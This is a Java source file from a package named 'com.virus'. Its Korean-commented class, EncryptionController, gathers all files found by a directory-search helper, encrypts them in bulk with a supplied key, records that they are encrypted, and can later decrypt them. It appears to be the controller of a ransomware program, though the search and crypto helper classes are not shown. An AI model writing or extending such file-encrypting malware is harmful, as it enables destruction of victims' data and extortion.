package com.virus;

import com.virus.security.CryptoUtils;
import com.virus.security.SearchDirectory;

import java.io.File;
import java.util.ArrayList;

/**
 * Created by codertimo on 16. 11. 19.. from kdh
 */

/**
 * Encrypt&Decrypt 과정에서 필요한 메소드를 자동으로 호출 및 처리
 */
public class EncryptionController {
    /**
     * SearchDirectory : 파일 검색에 필요한 객체
     * isEncrypted : 암호화 된 상태를 boolean 값으로 나타냄
     * key : 복암호화에 필요한 키
     */
    private SearchDirectory searchDirectory;
    private boolean isEncrypted = false;
    private String key;

    /**
     * constructor
     *
     * @param key
     */
    public EncryptionController(String key) {
        this.searchDirectory = new SearchDirectory();
        this.key = key;
        this.isEncrypted = searchDirectory.isEncrypted();
    }

    /**
     * isEncrypte get
     *
     * @return
     */
    public boolean isEncrypted() {
        return this.isEncrypted;
    }

    /**
     * 암호화 총괄 메소드
     */
    public void encryption() {
        ArrayList<File> files = searchDirectory.allFileSearch();
        searchDirectory.setEncrypted();
        System.out.println("암호화 시작");
        CryptoUtils.encrypt(files, key);
        System.out.println(files.size() + "개의 파일 암호화 성공");
        searchDirectory.clearFiles();
    }

    /**
     * 복호화 총괄 메소드
     */
    public void decryption() {
        ArrayList<File> encrypted_files = searchDirectory.decryptSearch();
        System.out.println("복호화 시작");
        CryptoUtils.decrypt(encrypted_files, key);
        System.out.println(encrypted_files.size() + "개 파일 복호화 성공");
        searchDirectory.setDecrypted();
        searchDirectory.clearFiles();
    }
}
